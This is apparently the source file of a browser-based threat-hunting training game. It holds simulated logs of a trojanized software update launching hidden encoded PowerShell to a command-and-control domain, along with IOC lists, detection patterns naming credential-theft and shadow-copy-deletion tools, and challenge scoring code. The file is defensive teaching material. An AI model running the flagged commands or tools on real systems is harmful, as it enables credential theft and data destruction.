      '2026-09-10 09:00:01 ENDPOINT 10.0.2.10 Installing update: vendor-agent-3.2.1.msi from internal update server',
      '2026-09-10 09:00:15 Sysmon EventID:1 10.0.2.10 Image:msiexec.exe CmdLine:"msiexec /i vendor-agent-3.2.1.msi /qn" Parent:updatechecker.exe',
      '2026-09-10 09:00:30 Sysmon EventID:1 10.0.2.10 Image:powershell.exe CmdLine:"powershell -nop -w hidden -enc UwB0AGEAcgB0AC..." Parent:vendor-agent.exe',
      '2026-09-10 09:00:35 Sysmon EventID:3 10.0.2.10 Image:powershell.exe DestIP:198.51.100.42 DestPort:443 (telemetry-cdn.net)',
      '2026-09-10 09:00:01 ENDPOINT 10.0.2.15 Installing update: vendor-agent-3.2.1.msi from internal update server',
      '2026-09-10 09:00:30 Sysmon EventID:1 10.0.2.15 Image:powershell.exe CmdLine:"powershell -nop -w hidden -enc UwB0AGEAcgB0AC..." Parent:vendor-agent.exe',
      '2026-09-10 09:00:35 Sysmon EventID:3 10.0.2.15 Image:powershell.exe DestIP:198.51.100.42 DestPort:443 (telemetry-cdn.net)',
      '2026-09-10 09:00:01 ENDPOINT 10.0.2.20 Installing update: vendor-agent-3.2.1.msi from internal update server',
      '2026-09-10 09:00:30 Sysmon EventID:1 10.0.2.20 Image:powershell.exe CmdLine:"powershell -nop -w hidden -enc UwB0AGEAcgB0AC..." Parent:vendor-agent.exe',
    ],
    explanation: 'The internal update server (10.0.1.50) was compromised via unauthorized SSH login from 45.33.99.12. The attacker replaced the legitimate vendor-agent MSI with a backdoored version (hash changed from abc123... to a1b2c3...). When endpoints auto-installed the "update", the backdoored agent spawned encoded PowerShell connecting to telemetry-cdn.net (a C2 domain disguised as telemetry). Multiple endpoints were compromised simultaneously through the same trojanized update — classic supply chain attack.',
  },
];

// ============================================================================
// ANALYSIS TOOLS — built-in databases for the analysis panel
// ============================================================================
const KNOWN_BAD_IPS = ['45.33.32.156', '185.220.101.42', '45.77.123.89', '198.51.100.42', '45.33.99.12', '178.128.242.134', '10.99.1.5', '185.100.87.33'];
const KNOWN_BAD_DOMAINS = ['update-cdn.xyz', 'invoice-portal.net', 'cdn-static-assets.com', 'telemetry-cdn.net', 'pool.minexmr.com', 'mega.nz'];
const SUSPICIOUS_UAS = ['curl/', 'wget/', 'python-requests/', 'Go-http-client', 'Nmap/', 'sqlmap/', 'Nikto/', 'Masscan/'];
const SUSPICIOUS_PROCESSES = ['mimikatz', 'psexec', 'procdump', 'lazagne', 'bloodhound', 'rubeus', 'certutil.*urlcache', 'mshta.*http', 'bitsadmin.*transfer', 'ntdsutil.*ifm', 'vssadmin.*delete', 'wmic.*shadowcopy', 'bcdedit.*recovery'];

// ============================================================================
// RENDER
// ============================================================================
export function renderThreatHuntLab(main) {
  var currentScenario = null;
  var markedLines = {};
  var foundIOCs = {};
  var hintsUsed = 0;
  var searchTerm = '';
  var scores = {};
  try { scores = JSON.parse(localStorage.getItem('thl_scores') || '{}'); } catch (_) {}

  function render() {
    main.innerHTML =
      '<style>' +
      '.thl-header { display:flex; align-items:center; gap:16px; padding:16px 0; border-bottom:2px solid #00e676; }' +
      '.thl-title { font-size:1.5rem; font-weight:800; color:#00e676; margin:0; letter-spacing:.05em; }' +
      '.thl-scenarios { display:grid; grid-template-columns:repeat(auto-fill,minmax(260px,1fr)); gap:10px; margin-top:16px; }' +
      '.thl-card { background:var(--card); border:1px solid var(--line); border-radius:6px; padding:14px; cursor:pointer; transition:all .15s; }' +
      '.thl-card:hover { border-color:#00e676; }' +
      '.thl-diff { font-size:.65rem; padding:2px 6px; border-radius:3px; font-weight:600; letter-spacing:.04em; }' +
      '.thl-diff-Easy { background:rgba(0,230,118,0.15); color:#00e676; }' +
      '.thl-diff-Medium { background:rgba(255,214,0,0.15); color:#ffd600; }' +
      '.thl-diff-Hard { background:rgba(255,145,0,0.15); color:#ff9100; }' +
      '.thl-diff-Expert { background:rgba(255,23,68,0.15); color:#ff1744; }' +
      '.thl-log-line { padding:3px 8px; font-size:.72rem; font-family:var(--mono,monospace); cursor:pointer; border-left:3px solid transparent; transition:background .1s; white-space:pre-wrap; word-break:break-all; }' +
      '.thl-log-line:hover { background:rgba(255,255,255,.03); }' +
      '.thl-log-line.marked { border-left-color:#ff1744; background:rgba(255,23,68,.06); }' +
      '.thl-log-line.highlight { background:rgba(0,229,255,.08); }' +
      '.thl-ioc-found { color:#00e676; }' +
      '.thl-ioc-missing { color:var(--mut); }' +
      '.thl-tools-panel { background:var(--card); border:1px solid var(--line); border-radius:6px; padding:12px; }' +
      '</style>' +
      '<div>' +
        '<div class="thl-header">' +
          '<h1 class="thl-title">THREAT HUNT LAB</h1>' +
          '<span style="color:var(--mut);font-size:.75rem">Find the Attacker in the Logs</span>' +
        '</div>' +
        '<div id="thl-content"></div>' +
      '</div>';

    var content = main.querySelector('#thl-content');
    if (currentScenario) renderChallenge(content);
    else renderScenarioList(content);
  }

  function renderScenarioList(container) {
    var html = '<p class="muted" style="font-size:.85rem;margin:12px 0 16px">Interactive threat hunting challenges. Analyze realistic logs, find the hidden IOCs, and identify the attacker. Click a scenario to start.</p>';
    html += '<div class="thl-scenarios">';
    SCENARIOS.forEach(function(s) {
      var score = scores[s.id];
      var scoreHtml = score !== undefined ? '<div style="font-size:.72rem;color:#00e676;margin-top:6px">Best: ' + score + '%</div>' : '';
      html += '<div class="thl-card" data-id="' + s.id + '">' +
        '<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">' +
          '<span style="font-weight:700">' + esc(s.name) + '</span>' +
          '<span class="thl-diff thl-diff-' + s.difficulty + '">' + esc(s.difficulty) + '</span>' +
        '</div>' +
        '<div style="font-size:.78rem;color:var(--mut)">' + esc(s.description) + '</div>' +
        '<div style="font-size:.68rem;color:var(--acc);margin-top:6px">MITRE: ' + s.mitre.join(', ') + '</div>' +
        scoreHtml +
      '</div>';
    });
    html += '</div>';
    container.innerHTML = html;
    container.querySelectorAll('.thl-card').forEach(function(card) {
      card.onclick = function() {
        currentScenario = SCENARIOS.find(function(s) { return s.id === card.dataset.id; });
        markedLines = {};
        foundIOCs = {};
        hintsUsed = 0;
        searchTerm = '';
        render();
      };
    });
  }

  function renderChallenge(container) {
    var s = currentScenario;
    var totalIOCs = s.iocs.length;
    var foundCount = Object.keys(foundIOCs).length;
    var score = Math.max(0, Math.round((foundCount / totalIOCs) * 100 - hintsUsed * 10));

    var html = '<div style="display:flex;align-items:center;gap:12px;padding:12px 0;border-bottom:1px solid var(--line);margin-bottom:12px">' +
      '<button class="btn sm ghost" id="thl-back">Back</button>' +
      '<h2 style="font-size:1rem;margin:0;flex:1">' + esc(s.name) + '</h2>' +
      '<span class="thl-diff thl-diff-' + s.difficulty + '">' + esc(s.difficulty) + '</span>' +
      '<span style="font-size:.82rem;font-weight:600;color:' + (foundCount === totalIOCs ? '#00e676' : 'var(--acc)') + '">' + foundCount + '/' + totalIOCs + ' IOCs found</span>' +
      '<span style="font-size:.82rem;color:var(--mut)">Score: ' + score + '%</span>' +
    '</div>';

    html += '<p style="font-size:.85rem;margin:0 0 12px">' + esc(s.description) + '</p>';

    // IOC checklist
    html += '<div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px">';
    s.iocs.forEach(function(ioc, idx) {
      var found = foundIOCs[idx];
      html += '<div style="font-size:.72rem;padding:4px 10px;border:1px solid ' + (found ? '#00e676' : 'var(--line)') + ';border-radius:3px;color:' + (found ? '#00e676' : 'var(--mut)') + '">' +
        (found ? '[FOUND] ' : '[?] ') + esc(ioc.type) + ': ' + (found ? esc(ioc.value) : '???') +
      '</div>';
    });
    html += '</div>';

    // Controls
    html += '<div style="display:flex;gap:8px;margin-bottom:8px;align-items:center">' +
      '<input type="text" id="thl-search" placeholder="Search logs..." value="' + esc(searchTerm) + '" style="background:var(--card);color:var(--txt);border:1px solid var(--line);padding:6px 12px;border-radius:4px;font-size:.78rem;flex:1;font-family:inherit">' +
      '<button class="btn sm ghost" id="thl-hint">Hint (' + (totalIOCs - foundCount) + ' remaining)</button>' +
      '<button class="btn sm ghost" id="thl-check">Check Answers</button>' +
      '<button class="btn sm" id="thl-solve">Reveal Solution</button>' +
    '</div>';

    // Log viewer
    html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;max-height:400px;overflow-y:auto;padding:4px 0" id="thl-logs">';
    s.logs.forEach(function(line, idx) {
      var isMarked = markedLines[idx];
      var matchesSearch = searchTerm && line.toLowerCase().indexOf(searchTerm.toLowerCase()) !== -1;
      html += '<div class="thl-log-line' + (isMarked ? ' marked' : '') + (matchesSearch ? ' highlight' : '') + '" data-idx="' + idx + '">' +
        '<span style="color:var(--mut);font-size:.65rem;margin-right:8px">' + (idx + 1) + '</span>' + esc(line) + '</div>';
    });
    html += '</div>';

    // Analysis tools
    html += '<div style="margin-top:12px"><h3 style="font-size:.85rem;margin:0 0 8px">Analysis Tools</h3>' +
      '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">' +
        '<div class="thl-tools-panel"><div style="font-size:.78rem;font-weight:600;margin-bottom:6px">IP Reputation</div>' +
          '<input type="text" id="thl-ip-check" placeholder="Enter IP..." style="background:var(--bg);color:var(--txt);border:1px solid var(--line);padding:4px 8px;border-radius:3px;font-size:.75rem;width:100%;margin-bottom:4px;font-family:inherit">' +
          '<div id="thl-ip-result" style="font-size:.72rem;color:var(--mut)"></div></div>' +
        '<div class="thl-tools-panel"><div style="font-size:.78rem;font-weight:600;margin-bottom:6px">Base64 Decoder</div>' +
          '<input type="text" id="thl-b64" placeholder="Paste base64..." style="background:var(--bg);color:var(--txt);border:1px solid var(--line);padding:4px 8px;border-radius:3px;font-size:.75rem;width:100%;margin-bottom:4px;font-family:inherit">' +
          '<div id="thl-b64-result" style="font-size:.72rem;color:var(--acc);word-break:break-all"></div></div>' +
      '</div></div>';

    container.innerHTML = html;

    // Wire events
    container.querySelector('#thl-back').onclick = function() { currentScenario = null; render(); };
    container.querySelector('#thl-search').oninput = function(e) { searchTerm = e.target.value; renderChallenge(container); };

    container.querySelector('#thl-logs').onclick = function(e) {
      var line = e.target.closest('.thl-log-line');
      if (!line) return;
      var idx = parseInt(line.dataset.idx);
      markedLines[idx] = !markedLines[idx];
      line.classList.toggle('marked');
    };

    container.querySelector('#thl-hint').onclick = function() {
      var nextHint = s.iocs.find(function(ioc, idx) { return !foundIOCs[idx]; });
      if (nextHint) {
        hintsUsed++;
        alert('Hint: ' + nextHint.hint);
      }
    };

    container.querySelector('#thl-check').onclick = function() {
      // Check if marked lines contain the IOCs
      var markedText = Object.keys(markedLines).filter(function(k) { return markedLines[k]; }).map(function(k) { return s.logs[k]; }).join(' ');
      s.iocs.forEach(function(ioc, idx) {
        if (foundIOCs[idx]) return;
        if (ioc.type === 'pattern') {
          // Patterns need specific keywords
          var keywords = ioc.value.toLowerCase().split(/\s+/);
          if (keywords.some(function(kw) { return markedText.toLowerCase().indexOf(kw) !== -1; })) foundIOCs[idx] = true;
        } else if (markedText.indexOf(ioc.value) !== -1) {
          foundIOCs[idx] = true;
        }
      });
      var newScore = Math.max(0, Math.round((Object.keys(foundIOCs).length / totalIOCs) * 100 - hintsUsed * 10));
      if (Object.keys(foundIOCs).length === totalIOCs) {
        if (!scores[s.id] || newScore > scores[s.id]) {
          scores[s.id] = newScore;
          try { localStorage.setItem('thl_scores', JSON.stringify(scores)); } catch (_) {}
        }
      }
      renderChallenge(container);
    };

    container.querySelector('#thl-solve').onclick = function() {
      s.iocs.forEach(function(_, idx) { foundIOCs[idx] = true; });
      alert(s.explanation);
      renderChallenge(container);
    };

    container.querySelector('#thl-ip-check').onkeyup = function(e) {
      var ip = e.target.value.trim();
      var result = container.querySelector('#thl-ip-result');
      if (!ip) { result.textContent = ''; return; }
      if (KNOWN_BAD_IPS.indexOf(ip) !== -1) result.innerHTML = '<span style="color:#ff1744;font-weight:600">MALICIOUS</span> — known bad IP in threat database';
      else if (ip.match(/^10\.|^172\.(1[6-9]|2|3[01])\.|^192\.168\./)) result.innerHTML = '<span style="color:var(--acc)">INTERNAL</span> — RFC 1918 private address';
      else result.innerHTML = '<span style="color:#ffd600">UNKNOWN</span> — not in local threat database';
    };

    container.querySelector('#thl-b64').onkeyup = function(e) {
      var b64 = e.target.value.trim();
      var result = container.querySelector('#thl-b64-result');
      if (!b64) { result.textContent = ''; return; }
      try { result.textContent = atob(b64); } catch (_) {
        try { result.textContent = decodeURIComponent(escape(atob(b64.replace(/-/g, '+').replace(/_/g, '/')))); } catch (__) { result.textContent = '(invalid base64)'; }
      }
    };
  }

  render();
}
